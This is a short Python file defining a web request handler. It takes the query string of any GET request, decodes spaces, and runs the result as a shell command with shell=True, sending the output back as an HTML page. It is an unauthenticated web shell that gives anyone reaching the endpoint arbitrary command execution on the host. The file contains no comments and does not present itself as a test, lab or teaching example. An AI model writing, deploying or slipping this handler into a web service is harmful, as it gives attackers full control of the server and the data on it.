import subprocess
from subprocess import call
import sys
import os

def myrun(cmd):
    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    stdout = []
    while True:
        line = p.stdout.readline()
        stdout.append(line+'<br>')
        if line == '' and p.poll() != None:
            break
    return ''.join(stdout)

def request_handler(socket_dictionary):
    if socket_dictionary['method'] == 'GET':
        request_data_split = socket_dictionary['url'].split('?')
        try:
            request_data_split = request_data_split[1].split('%20')
            i = 0
            command = ''
            for element in request_data_split:
                try:
                    command = command + request_data_split[i] + ' '
                    i = i + 1
                except:
                    'Do nothing'
        except:
            command = request_data_split[1]
        try:
            retcode = call(command, shell=True)
            if retcode < 0:
                output = myrun(command)
                socket_dictionary['html_output'] = output
            else:
                output = '<html><body>'+myrun(command)+'</body></html>'
                socket_dictionary['html_output'] = output
        except OSError as e:
            socket_dictionary['html_output'] = sys.stderr.read()
    all_socket_dictionary = socket_dictionary
    return all_socket_dictionary
